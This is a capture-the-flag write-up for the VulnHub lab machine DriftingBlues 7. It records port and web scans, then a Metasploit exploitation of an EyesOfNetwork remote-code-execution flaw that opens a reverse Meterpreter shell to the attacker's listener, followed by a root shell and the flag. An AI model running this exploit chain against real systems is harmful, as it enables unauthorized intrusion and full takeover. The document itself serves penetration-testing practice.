# BOX NAME: DriftingBlues 7 
**LINK**: https://www.vulnhub.com/entry/driftingblues-7,680/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. This box went quite automated. Metasploit is way powerful sometimes. Yikes.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.54
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db7.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 12:57 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 12:57 (0:00:12 remaining)
Nmap scan report for test.driftingblues.box (10.77.0.54)
Host is up (0.00029s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4fae55f88c1a1f0518baee3fbc12772 (RSA)
|   256 01978bbfadba5c78a74590a10a63fc21 (ECDSA)
|_  256 452839e01ba885e0c0b0fa1f008c5ed1 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
|_http-title: Did not follow redirect to https://test.driftingblues.box/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
| http-title: EyesOfNetwork
|_Requested resource was /login.php##
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-04-03T14:37:22
|_Not valid after:  2022-04-03T14:37:22
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MariaDB (unauthorized)
8086/tcp open  http     InfluxDB http admin 1.7.9
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-db7.log --follow-redirect=always
http://driftingblues.box [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.77.0.54], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[https://driftingblues.box/], Title[302 Found]
https://driftingblues.box/ [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.77.0.54], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[./module/dashboard_view/index.php], X-Powered-By[PHP/5.4.16]
Error: Invalid redirection from https://driftingblues.box/module/dashboard_view/index.php to /login.php##. bad URI(is not URI?): "/login.php##"
https://driftingblues.box/module/dashboard_view/index.php [302 Found] Apache[2.4.6][mod_fcgid/2.3.9,mod_perl/2.0.11], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3], IP[10.77.0.54], OpenSSL[1.0.2k-fips], PHP[5.4.16], Perl[5.16.3], RedirectLocation[/login.php##], Title[302 Found]

```

nikto-scan

```
└─$ nikto -h $IP -ssl | tee nikto-db7.log
- Nikto v2.5.0
---------------------------------------------------------------------------                                                                                                                                                                                                                                                                                                              
+ Target IP:          10.77.0.54                                                                                                                                                                                                                                                                                                                                                         
+ Target Hostname:    10.77.0.54                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+ Target Port:        443                                                                                                                                                                                                                                                                                                                                                                                                                                                               
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost/emailAddress=root@localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost/emailAddress=root@localhost
+ Start Time:         2023-04-27 12:58:46 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3
+ /: Retrieved x-powered-by header: PHP/5.4.16.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: ./module/dashboard_view/index.php
+ Hostname '10.77.0.54' does not match certificate's names: localhost. See: https://cwe.mitre.org/data/definitions/297.html
+ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ OpenSSL/1.0.2k-fips appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ mod_fcgid/2.3.9 appears to be outdated (current is at least 2.3.10-dev).
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Perl/v5.16.3 appears to be outdated (current is at least v5.32.1).
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /README.md: Readme Found.                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+ 8908 requests: 0 error(s) and 19 item(s) reported on remote host                                                                                                                                                                                                                                                                                                                                                                                                                      
+ End Time:           2023-04-27 13:04:31 (GMT2) (345 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
EyesOfNetwork CMS VERSION : 5.2
```
other

```
[*] 10.77.0.54:443 - The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > run

[*] Started reverse TCP handler on 10.77.0.35:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.
[*] Using generated API key: 052839afa8ec6e3291b6eb5f1037c7904beab6d1df59a829c84054fec04db6ab
[+] Authenticated as user 1jKOzZad
[*] Command Stager progress - 100.00% done (897/897 bytes)
[*] Sending stage (3045348 bytes) to 10.77.0.54
[*] Meterpreter session 1 opened (10.77.0.35:4444 -> 10.77.0.54:59018) at 2023-04-27 13:04:35 +0200

meterpreter > 

```


</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```

```

DNS (Port 53)
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
meterpreter > sysinfo
Computer     : driftingblues.localdomain
OS           : CentOS 7.7.1908 (Linux 3.10.0-1062.9.1.el7.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
Used metasploits eyesofnetwork autodetect and local exploit suggester. Got root realquick.
```
```
meterpreter > shell
Process 4769 created.
Channel 106 created.
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

```
</details>